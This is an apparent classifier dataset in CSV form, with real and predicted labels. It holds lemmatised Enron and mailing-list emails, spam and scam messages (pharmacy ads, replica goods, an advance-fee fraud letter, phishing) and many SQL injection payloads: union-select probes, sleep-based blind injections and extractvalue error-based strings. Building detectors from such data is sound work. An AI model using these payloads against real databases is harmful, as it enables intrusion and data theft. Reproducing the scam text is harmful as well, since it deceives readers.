Clean_Text,Real_Label,Predicted_Label
"marketpoint license agreement john fyi vince forward vince j kaminski hou ect 11 27 2000 03 31 pm "" dale m nesbitt "" 11 27 2000 02 51 54 pm please respond cc subject marketpoint license agreement vince send contract week long engagement way send time and material contract space individual task statement task statement week long project $ 12 k level cost and risk cap look day or regard long run and short run gas model implement software system prerequisite run operate way and sum consume approximately resource individually plan extended visit houston begin week from today and last following wednesday intensively tutor daughter semester economic final rice certainly get well look tutor easy come and finalize need finalize week houston spend good bit time look stuff day or look forward work and your colleague thank dale original message from vince j kaminski enron com mailto vince j kaminski enron com send monday november 27 2000 10 44 dale nesbitt worldnet att net cc vince j kaminski enron com subject marketpoint license agreement dale thank your message phone conversation meeting mention contractual arrangement work your company employee case study cost weekly project $ 12 000 apply purchase price ahead and decide acquire software project allow evaluate model and come estimate manpower necessary support model internally please let know option primarily interested long term natural gas model and database north america familiarity short term model prerequisite don ' t resource spend time course trading desk interested short term version model shall talk vince "" dale m nesbitt "" 11 13 2000 06 00 05 pm "" vince j kaminski "" cc subject marketpoint license agreement john vince enjoy meeting day and broad cross section your people thank set and thank give opportunity speak your people mention john send license paperwork marketpoint attach standard license agreement your consideration mention license agreement cover entire bundle product include north american gas short and long term north american electricity short and long term world gas western european gas world oil finish port world oil world gas and western european gas model from old now obsolete software system marketpoint fully test and complete couple month gas and electricity model north america presently complete and test allow attractive price worldwide toolkit available your worldwide business understand want gas modeling capability and want defer decision electric or capability mention meeting prepared offer approximately fully bundle price read license agreement software license $ 100 000 annually gas datum $ 5 000 and electric datum $ 10 000 marketpoint agree license gas model plus datum software license plus data license total $ 55 000 annually fully bundle price think consistent discussion meeting and from marketpoint ' s perspective provide great basis forward enron or enron desire "" scale "" model or model s from marketpoint portfolio simply scale entire license agreement allow decouple gas decision from decision glad additional pricing provision agreement decide forward feel able communicate philosophy scope and operation approach meeting and deliver information need evaluate marketpoint meet your need think able depth and sophistication product time simplicity and effectiveness think able benefit marketpoint dimension economic equilibrium complement and supplement approach assuredly use interested your impression and your colleague look forward your response and move ahead view important prospective customer and client and work earn and secure your business decide license marketpoint arrange transfer and mount marketpoint and short term narg model model suggest begin and travel houston deliver 1 day training seminar client usually fluent 1 day training seminar want work short term narg model week speed fluent and comfortable delivery long term version narg week later thank and good item from meeting forget send please remind note don ' t speak lot write note meeting and overlook want dale nesbitt president marketpoint inc 27121 adonna ct los altos hill 94022 650 218 3069 dale nesbitt marketpointinc com attach file license doc",0,0
dear jose continue your address confirm your ownership confirm ownership monkey.org setup team,1,1
-8504 where 3086 = 3086 or 1131 = 9188,2,2
rise desire dream man apart from status profession or want good time depend offer m pg e vak di tmv yxq tion increase your self concept good v jge ia acq gr jg a. v pa ph ag sy ra zfq cre qjg ase body ability achieve and maintain e qj gr ct ju ion d qrh u ja ri ky ng s pay e km xu al sti jqo mul okc ation second c qa fui al pv l lfx ev qkh vw ra effective and secure good wish your li uv ne g bmi p,1,1
"1'+ select tvpj where 7058 = 7058 or 8384 = like ' abcdefg',upper hex randomblob 500000000/2 + '",2,2
time associate or professorship from april 1996 english language program french language program german language program nagoya university commerce and business administration invite application from associate or professor relevant academic and teaching experience doctorate degree linguistic education or relevant regional study field and teaching experience must applicant must publish 20 work academic high professional standing faculty member expect language class and lecture cultural and social background region initial contract employment generally minimum period year pende mutual agreement employer and employee contract renewable annually start salary establish accord qualification and experience present salary range from 9 11 million yen annum faculty normally teach 90 minute period week monday friday school year organise 15 week semester 1st april end july september mid february summer break approximately 6 week long winter break approximately 3 week long 6 week spring ' break ' official commitment travel outside japan period subject approval accommodation provide faculty assistance give find suitable location and draw contract financial assistance offer form interest free advance arrival expense low interest car loan available return air fare provide campus situate outskirt nagoya 3rd large city japan nagoya heart industrial zone japan and coastal city easy reach tokyo 2 hour osaka 1 5 hour and area historical and cultural interest language center superbly appoint advanced computer facility and modern amenity student macintosh computer powerbook 520 present language faculty consist member teach english chinese french german korean and thai please send or fax possible application melanie bowyer executive assistant president nagoya university commerce and business administration 4 4 sagamine komenoki cho nisshin city aichi 470 01 japan telephone 81 05617 3 2111 fax 81 05617 3 1202 e mail mbowyer nucba ac jp,0,0
1 ' boolean mode union select null null null null null null null null null nullsql_comment,2,2
"1 avdz where 1881 = 1881 and 6510 = select count * from sysuser sys1,sysuser sys2,sysuser sys3,sysuser sys4,sysuser sys5,sysuser sys6,sysuser sys7 sql_comment",2,2
"1 procedure analyse extractvalue 5840,concat 0x5c,0x7171706a71 select case 5840 = 5840 1 0 end 0x717a767a71 1 and 6986 = 6986",2,2
uk ppi curve generator smoothing forward zimin lu hou ect 03 31 2000 01 43 pm anjam ahmad 03 28 2000 02 08 pm martina angelova lon ect ect trena mcfarland lon ect ect cc dale surbey lon ect ect mary thambiah lon ect ect zimin lu hou ect ect stinson gibner hou ect ect vince j kaminski hou ect ect subject uk ppi curve generator smoothing hi martina trena think reasonable smoothing method short and long term model let know need explain include short term model now self stand spreadsheet probably need clean bit zimin stinson agree short term and long term model dzcv and pllu ppi index meeting dale and trena and simple smoothing employ result follow blue and red curve propose dzcv and pllu ppi index forward curve whilst rpi market derive black curve regard anjam x 35383,0,0
get tell inspire performance bed clinically prove 100 safe buy drug store now not extra charge license cost and expense drugstore cover operate normally get viagra from line pharmacy purchasecomfort and harmony half reduce price!the good pirice offer right now look!tramaderol $ 0.46 vyigra professional $ 3.73 propecia $ 0.44url_token,1,1
"make_set 8734 = 8734,sleep 5",2,2
east origination talk duran mean oxley send from blackberry wireless handheld www blackberry net,0,0
"1 ' and 8514 = select count * from domain.domain t1,domain.column t2,domain.table t3 and ' wmrr ' like ' wmrr",2,2
1 ' where 9216 = 9216,2,2
yuen ren society promotion chinese dialect fieldwork annual conference saturday 6 march 1999 submission now accept conference hold saturday 6 march 1999 rutgers university new jersey society welcome presentation non formalist character aspect hann chinese dialectology include original field report comparative historical study linguistic geography and contact sociolinguistic and taxonomy presentation aspect chinese dialect or social context welcome please note society favor presentation include abundant evidence form dialect datum or explicit documentation appropriate paper deliver english or mandarin chinese submit paper please send detailed abstract address deadline submit abstract 31 december 1998 expect accept paper yuen ren society devoted practice descriptive dialect fieldwork and especially welcome report little know dialect david prager branner r vanness simmons c o yuen ren society c o east asian language culture 440 riverside drive 73 330 scott hall new york ny 10027 6831 usa rutgers university new brunswick nj 08901 1164 usa fax 212 865 5507 fax 732 932 7926 email < yuen ren society bigfoot com > < rsimmon rci rutger edu > or < charmii bigfoot com >,0,0
love deeply get overwhelmed orgasm url_token sql_comment opera revolutionary e mail client url_token,1,1
fw kim ward status louise update original message from tycholiz barry send wednesday january 23 2002 10 22 milnthorp rob subject kim ward status rob status kim ' s revive bonus approve like resolve soon possible staff meeting pls respond e mail thx bt,0,0
"-3492 "" where 4094 = 4094 or 3440 = cast chr 113 ||chr 113 ||chr 112 ||chr 106 ||chr 113 || select case 3440 = 3440 1 0 end text|| chr 113 ||chr 122 ||chr 118 ||chr 122 ||chr 113 numeric sql_comment",2,2
consolidate your debt eliminate legally eliminate your creditt card and unsecured debt * make payment your creditor * affect your credit long term * confrontation visit www.freshplateworks.com * bankruptcy * consolidation * or refinancing kind visit here www.freshplateworks.com learn * must minimum $ 10k combined household unsecured debt apply * must resident,1,1
petrochem desk vasant help kate help project vince forward vince j kaminski hou ect 04 23 2001 09 28 nelson neale enron 04 20 2001 10 29 vince j kaminski hou ect ect vasant shanbhogue enron enronxgate cc subject petrochem desk chance speak christian lebroc morning regard curve building petrochemical turn christian leave rac april and join petrochem desk trader previous effort construction forward curve group focus intuition or swag unfortunately group rough p l year blame direct forward curve or lack thereof ask fundamental group christian indicate ' d 3 4 month and suited curve building john nowlan head group from timing perspective tell christian probably 6 8 week develop curve especially consider need understand key market driver fundamental suggest yesterday meeting strong relationship petrochemical and nymex component e g crude oil provide great beginning point potentially strengthen augment relationship key factor e g supply and demand term bear market research nelson,0,0
"mg metal summary var methodology and current status dear anjam and highly productive and informative set meeting andreas barkchis mg metal ny thursday 20 th july ny office firstly "" thank "" andreas helpful address numerous request information look forward establish solid work relationship go forward find summary version 1 initial rough calculation mg metal ' s var anjam kirstee from london and cantekin grant vince and houston work 2 day spreadsheet var model current status effort and plan future progress summarize enclose document v r methodology mg metal position version 1 introduction document describe initial rough model calculation value risk mg metal model implement spreadsheet serve prototype risktrac implementation risk factor follow position represent mg metal  s risk and cover version 1 base metal  position include aluminium copper gold lead nickel silver tin zinc risk relate position quantify simulate forward price metal copper concentrate risk relate position quantify simulate tc charge cocoa bean risk relate position quantify simulate forward price cocoa bean 10 curve drive risk price curve aluminium copper gold lead nickel silver tin zinc and cocoa bean plus tc curve copper concentrate assumption and simplification metal go use single price curve or type product physical financial lme trade comex trade scrap alloy stock etc delta gamma approach risk option  position component require implement v r model current forward price available from mercur current imply volatility available reuter current position from mercur history price require calculate factor loading and correlation commodity methodology version 1 base risk matrix approach calculate principal component metal and cocoa bean account correlation term structure calculate correlation commodity base prompt month price history 3 month portfolio hierarchy position assign follow portfolio portfolio agg metal mg metal mg metal mg metall recycling gmbh ffm sub portfolio follow sub portfolio comex frame contract lme lme alloy lme metal index option option physical physical alloy physical real physical scrap price prov billing stock stock alloy stock comex stock physical stock scrap",0,0
increase your thickness and length short week woman simply love large manhood average gain 3.02 inch where matter and gain 100 permanent url_token,1,1
"> + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = > daily 10 > from cnn.com > video and story aug 1 2008 3:58 pm edt > + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = + = 10 video 1 montauk ' monster ' url_token devil dog turtle montauk monster cnn jeanne moo ask "" thing "" 2 racy photo toddler mom url_token 3 news absurd episode 54 url_token 4 police beat dispute url_token 5 mom plead girl return url_token 6 defendant fake heart attack url_token 7 killer carry victim head url_token 8 murder confession recant url_token 9 anthrax suspect home url_token 10 heckler interrupt obama talk url_token 10 story 1 suspect beheading identify url_token canadian police vince weiguang li 40 edmonton charge second degree murder beheading man bus 2 judge take jena 6 case url_token 3 people mag get pitt jolie pix url_token 4 attack toronto call racial url_token 5 ireporter ' unusual name url_token 6 mother plead child return url_token 7 karadzic deal u.s url_token 8 suspect arrest swim killing url_token 9 anthrax suspect apparent suicide url_token 10 mccain obama criticism ' fair ' url_token cnn trust news > cable news network lp lllp < > cnn center atlanta georgia 30303 < > 2008 cable news network lp lllp < > time warner company < > right reserve < = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = please send comment or suggestion go = = url_token = = = = read privacy guideline go = = url_token = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = agree receive email from cnn.com result your cnn.com preference setting manage your setting url_token unsubscribe from daily 10 url_token",1,1
intern acceptance and decline agree coordinate kristin associate and happen date mind let know late start date intern june 4 try schedule week june or early july thank lexi from sally beck ect 04 04 2001 08 27 lexi elliott na enron enron cc richard causey corp enron enron subject intern acceptance and decline summer host lunch summer intern right end assignment ut alum attend lunch feedback from summer intern favorable key comment great early summer intern network enron ut alum summer plan ut intern early summer probably work include summer associate glad help way let know enron north america corp from lexi elliott enron 04 03 2001 05 10 pm richard causey corp enron enron mark e lindsey gpgfin enron enron sally beck hou ect ect craig breslau hou ect ect cedric burgher enron enronxgate rick l carson enron enronxgate brent price enron enronxgate hunter s shively hou ect ect stan dowell hou ee ee jay boudreaux enron enronxgate marshall eubank enron enronxgate mary lynne ruffer hou ee ee michael vigeant hou ee ee mark confer hou ect ect michael howe hou ee ee john craig taylor hou ect ect jim cole enron enronxgate sarah goodpastor enron communication enron communication brandon neff hou ee ee christopher coffman corp enron enron ilan caplan enron development enron development christopher chenoweth enron enronxgate marcus edmond enron enronxgate zeina el azzi enron communication enron communication victor guggenheim hou ect ect mike deville hou ect ect darlene regan hou ee ee kreg hall hou ect ect mason hamlin hou ect ect shilpa mane lon ect ect zal masani enron communication enron communication zachary mccarroll enron communication enron communication luis mena na enron enron christine milliner enron enronxgate chetan paipanandiker hou ect ect catherine pernot enron enronxgate lauren schlesinger enron enronxgate susan m scott hou ect ect rahul seksaria enron enronxgate michael simmons enron communication enron communication millie gautam hou ee ee sachin gandhi na enron enron bilal bajwa na enron enron amanda schultz na enron enron rachana iyengar hou ee ee travis hansen hou ee ee felipe ospina na enron enron irina nekrasova hou ee ee jeremy lo hou ee ee cc jacqueline coleman na enron enron subject intern acceptance and decline dear longhorn team following ut candidate accept offer internship vinay adenwala cathy wang vivek shah kruti patel daniel payne wesley thoman michelle yee rachel ravanzo ainsley gaddi offer outstanding courtney gibb offer decline pranav gandi jessica payne and ameet rane thank your help make spring recruit success lexi 3 4585,0,0
"1 ' nxhp where 2649 = 2649 or 9643 = select count * from domain.domain t1,domain.column t2,domain.table t3 sql_comment",2,2
1 uvep where 6016 = 6016 and 6969 = select 6969 from pg_sleep 5 sql_comment,2,2
offer rep1!c@ watch pen bag and jewelry world url_token,1,1
-1087 where 5787 = 5787 union select 5787,2,2
assure perfectly function luxurious timepiece affordable url_token,1,1
"manage director dah sing bank ltd 36th floor dah sing bank financial centre ltd 108 gloucester road hong kong phone fax +852 3010 7073 dear friend mr hon he wong manage director dah sing bank ltd hong kong contact respect portfolio amount $ 35,520,000 usd thirty million and thousand united states dollar deposit german merchant name mr mathew schneider 18th october 2002 mr mathew schneider deposit $ 12,000,000 usd million united states dollar portfolio management department year and deposit mature 18th october 2006 196 growth amount total $ 35,520,000 usd thirty million and thousand united states dollar mr mathew schneider pass away state kin deposit fund establishment point finalize divorce wife and kid couple fact orphan fund mature and roll fund expire sum $ 35,520,000 usd thirty million and thousand united states dollar possession bank lifeless and unnoticed claim fund and material and immaterial document and certificate relate fund possession accord hong kong law regulating case nature typical asian country expiration 5 year fund revert ownership government finance military operation purchasing arm and ammunition military order avert negative development like seek your permission foreigner stand kin mr mathew schneider fruit old man labor use financing weapon enhance course war world general money pay your account share ratio 60 and 35 and balance 5 responsible major /trivial expense incur course transaction risk paperwork project attorney and position credit officer guarantee successful execution project interested please reply immediately your response shall provide information and modality help understand transaction observe utmost confidentiality and rest assure project profitable party shall require your assistance invest share your country await your urgent reply thank and regard mr hon he wong",1,1
"week ago ask following question > somebody please tell sri lanka write and > pronounce spanish pronunciation uniform latin > america reason ask student peruvian tell pronounce esrilanka recall mexican tell sirlanka wrong partly here response receive en reponse ton mail sur la prononciation de sri lanka en espagnol je peux dire qu ' en amerique du sud chili argentine prononce et ecrit siri lanka latin american friend tell ' sri lanka ' pronounce expect sri lanka dental alveolar r and velar nasal spell spell en respuesta su pregunta sobre la escritura y la pronunciacion de sri lanka en espanol le puedo decir lo siguiente en cuanto la escritura si equivoco se mantiene el original sri lanka sin embargo en cuanto la pronunciacion existe la tendencia general intercalar una de apoyo entre la s y la r siri ello excluye que cierto individuos considerandose mas "" culto "" y mas "" sabio "" hagan el esfuerzo de pronunciar sri esfuerzo que rompe con la tendencia del espanol de evitar toda s liquida esfuerzo por consiguiente considerado "" natural "" con respecto la pronunciacion en latinoamerica puedo decirle gran cosa pero imagino que tambien se ha generalizado la tendecia fonetica intercalar la vocal pronounce ezri ' la ' nka r = trill n = velar nasal normal speech rapid speech z assimilate follow rhotic produce sound intermediate quality assimilation know fact spanish phonetic nonaspirate dialect describe instance navarro toma ' standard manual slow speech esri ' voice from spain aspirate dialect ehri ' ~ eri ' from seville spain write country sri lanka and pronounce sri lanka pronounce esri lanka fact like sequence sc onset word realize listen spanish people speak english espein instead spein argentina sri lanka pronounce siri lanka r sound accord ipa post dental percusive sound n velar call daughter writer la jornada local newspaper work economics section say spelling like english suppose "" purist "" publication probably change k c write sri lanka piece paper and ask 5 people office pronounce confirm suspicion people pronounce spanish marked e beginning spanish phonology require st instance rest tend sonorize s expect mexican spanish conclusion and ' speaker spanish 1st lang pronounce "" normally "" work number argentine journalist and notice worth note mean probably pronounce from "" penaja wkuvx1 wku edu "" juan antonio pena far spelling sri lanka spanish orthography asian country far phonetic thing worth note insert ' e ' e sound beginning word sri spanish word begin s + stop consonant spain state write english sri lanka geographical island ceilan accent ' ' pronunciation tv and broadcasting vary people say sri ' lanka esri ' lanka r stand multiple trill rr spanish sound perro hear spain use pronounce old island ceilan different way common pronunciation esrri lan ka use double r spanish hard r and n velarize nasal sound pronunciation common siri lan ka know origin impression esrilanka common spain and sirilanka prevalent south america obviously absolute thank respond marc picard",0,0
1 where 1203 = 1203 rlike select * from select sleep 5 vwyq,2,2
"1 and row 6237,7469 > select count * concat 0x7171706a71 select elt 6237 = 6237,1 0x717a767a71,floor rand 0 * 2 x from select 5192 union select 3785 union select 3931 union select 7158 group x and 4127 = 4127",2,2
"claim incorrectly german sentence nominative accusative case syncretism like 1 unambiguous clause initial noun phrase construe subject 1 die tochter hat die mutter gek "" usst nom acc daughter nom acc mother kiss allegedly svo daughter kiss mother allegedly ovs mother kiss daughter 1 fact ambiguous svo interpretation prefer ovs interpretation blue contexts steer discussion example german or verb second language parse literature thank beatrice santorini b santorini nwu edu",0,0
"-1083 ' union select 9993,9993,9993,9993,9993,9993,9993,9993,9993sql_comment",2,2
"1 ' or extractvalue 1297,concat 0x5c,0x7171706a71 select elt 1297 = 1297,1 0x717a767a71 and ' blnh ' like ' blnh",2,2
enron hpl actual november 17 19 2000 november 17 20000 teco tap 30 000 enron 33 750 hpl gas daily november 18 2000 teco tap 30 000 enron 120 000 hpl gas daily november 19 2000 teco tap 23 125 enron,0,0
